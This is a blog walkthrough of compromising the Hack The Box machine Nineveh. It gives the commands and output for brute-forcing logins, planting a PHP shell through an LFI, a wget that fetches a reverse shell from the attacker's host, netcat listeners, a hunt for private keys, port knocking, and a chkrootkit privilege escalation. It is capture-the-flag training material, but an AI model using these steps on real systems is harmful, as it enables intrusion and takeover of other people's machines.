---
layout: post
title:	"Nineveh Writeup"
date:	2018-02-05 21:30:00
categories:
    - blog
tags:
    - hackthebox
---

Let's start with NMAP:


~~~
root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-06 04:37 EST
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 1.25% done; ETC: 04:51 (0:13:07 remaining)
Nmap scan report for 10.10.10.43
Host is up (0.12s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.8 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.8 (92%), Linux 3.8 - 3.11 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   116.13 ms 10.10.14.1
2   131.37 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.82 seconds

~~~

After enumerated HTTP and HTTP I found:

~~~
root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, txt, db, js | Threads: 10 | Wordlist size: 62279

Error Log: /opt/dirsearch/logs/errors-18-02-06_04-45-25.log

Target: http://nineveh.htb

[04:45:25] Starting: 
[04:46:04] 403 -  299B  - /server-status
[04:46:23] 301 -  315B  - /department  ->  http://nineveh.htb/department/
[04:46:43] 200 -  178B  - /

Task Completed
root@kali:~# dirsearch.py --url https://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, txt, db, js | Threads: 10 | Wordlist size: 62279

Error Log: /opt/dirsearch/logs/errors-18-02-06_04-59-00.log

Target: https://nineveh.htb

[04:59:01] Starting: 
[04:59:04] 301 -  309B  - /db  ->  https://nineveh.htb/db/
[04:59:41] 403 -  300B  - /server-status
[05:00:21] 200 -   49B  - /

Task Completed
~~~

There was phpLiteAdmin v1.9 on https://nineveh.htb/db/index.php: 

![Screenshot]({{ site.baseurl }}/images/2018-02-05-htb-nineveh/img1.png)

I tried to bruteforce the login with hydra:

~~~
hydra -l '' -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
[443][http-post-form] host: nineveh.htb   password: password123
~~~

I found [this](https://www.exploit-db.com/exploits/24044/) vulnerability but it didn't work because the path of the saved db (/var/tmp/syrion.php) was not in the directories of the web server. I tried to move the db in /var/www/, /var/www/html and /var/www/ssl but I got this error:

~~~
Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
~~~

So the application didn't have the permissions for write there.

At this point I tried to bruteforce the login in http://nineveh.htb/department :

![Screenshot]({{ site.baseurl }}/images/2018-02-05-htb-nineveh/img2.png)

The credentials were admin:1q2w3e4r5t.

After some enumeration of the web app I found something like an LFI in http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt,
I tried to include my db /var/tmp/syrion.php (but it didn't work.


By rename the db ninevehNotes1.php I was able to incude my shell and execute command:

![Screenshot]({{ site.baseurl }}/images/2018-02-05-htb-nineveh/img3.png)

In the source code of the page there was this check:

~~~
if(!strpos($file, "ninevehNotes"))
    exit("No Note is selected.");
~~~

I uploaded a reverse shell with wget and then include it:

~~~
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php

http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes2.php
~~~

And I got a reverse shell:

~~~
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 50710
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 08:31:57 up  3:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3.5 -c "import pty;pty.spawn('/bin/bash')"
www-data@nineveh:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

From the sshd_config file we knew that the user could access ssh with a private key, so I start to enumerate the sistem in order to find this key:

~~~
www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
<find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"     

Binary file /var/www/ssl/secure_notes/nineveh.png matches
~~~

Mmm was the private key hidden in the png?

~~~
root@kali:~/Desktop# binwalk -e  nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


root@kali:~/Desktop# cd _nineveh.png.extracted/
root@kali:~/Desktop/_nineveh.png.extracted# ls
2BF8D0.tar  54  54.zlib  secret
root@kali:~/Desktop/_nineveh.png.extracted# cd secret/
root@kali:~/Desktop/_nineveh.png.extracted/secret# ls
nineveh.priv  nineveh.pub
~~~

Ok I got the private key, but there was no ssh in the nmap scan. After a bit of enumeration I found this configuration file:

~~~
www-data@nineveh:/etc$ cat knockd.conf
cat knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
~~~

I needed to send the knock sequence to open the ssh port, I did it with nmap:

~~~
for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
~~~

At this point I was the user amrois:

~~~
root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ 
~~~

There was an insteresting file in the crontab:

~~~
amrois@nineveh:/tmp$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
~~~

~~~
amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
~~~

~~~
amrois@nineveh:/tmp$ ls -lah /report/
total 64K
drwxr-xr-x  2 amrois amrois 4.0K Feb  6 11:06 .
drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:00 report-18-02-06:11:00.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:01 report-18-02-06:11:01.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:02 report-18-02-06:11:02.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:03 report-18-02-06:11:03.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:04 report-18-02-06:11:04.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:05 report-18-02-06:11:05.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:06 report-18-02-06:11:06.txt
~~~

After a research on google I discovered that the reports were generated by chkrootkit. Because of crontab, I supposed it was vulnerable to [this](https://www.exploit-db.com/exploits/33899/) exploit. As described I created a file in /tmp that execute a python reverse shell called update and I got it:

~~~
root@kali:~# nc -vlp 5555
listening on [any] 5555 ...
connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 60862
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
~~~

:-)